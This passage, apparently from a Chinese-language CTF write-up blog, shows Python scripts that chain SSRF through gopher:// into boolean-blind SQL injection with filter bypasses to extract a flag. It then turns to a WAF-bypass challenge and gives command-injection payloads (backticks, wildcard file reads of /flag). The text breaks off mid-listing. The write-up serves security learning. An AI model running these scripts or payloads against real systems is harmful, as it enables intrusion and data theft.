class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/10/ROIS/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/10/ROIS/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/10/ROIS/image-20230412130046708.png"></p><p>浏览器发送一次请求，记住python出payload的时候要url编码两次</p><p><img src="/2023/02/10/ROIS/image-20230412130722783.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130832052.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/10/ROIS/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p><hr><h3 id="cachewaf"><a href="#cachewaf" class="headerlink" title="cachewaf"></a>cachewaf</h3><p>一道初见被乱杀的防火墙绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简短的题目，极致的享受（×</p><p>这eval就摆在面前就别怪system直接shell了(</p><p><img src="/2023/02/10/ROIS/image-20230408224620364.png"></p><p>emmm，说是右括号出了点问题，考虑到这道题有防火墙，先排查一下问题出哪了。<img src="/2023/02/10/ROIS/image-20230408223545003.png"></p><p>看起来括号本身应该不是问题，echo也没被过滤，引号也没问题，应该是system被拦截了，继续尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;system&quot;</span>)(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408224700965.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls`;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408223928850.png"></p><p>(“system”)和反引号没被过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls /`;<span class="hljs-comment">#查看根目录下发现存在/flag</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-comment">#尝试读取flag，结果没有回显，看起来flag被过滤了</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /f*`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /fl<span class="hljs-string">&#x27;a&#x27;</span>g`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /f?ag`;<br><span class="hljs-comment">#尝试上述两种绕过均可读取到flag</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408232643615.png"></p><p>但是提交flag时发现是假的flag，果然不可能这么简单啊（悲</p><p>既然这样不妨看一看waf.php查看下防火墙规则吧（waf.php也被过滤了用w*绕过，网页直接读取文件没有分行实在难受，就用bp抓包后发传参了）</p><p><img src="/2023/02/10/ROIS/image-20230408233044629.png"></p><p>waf.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span 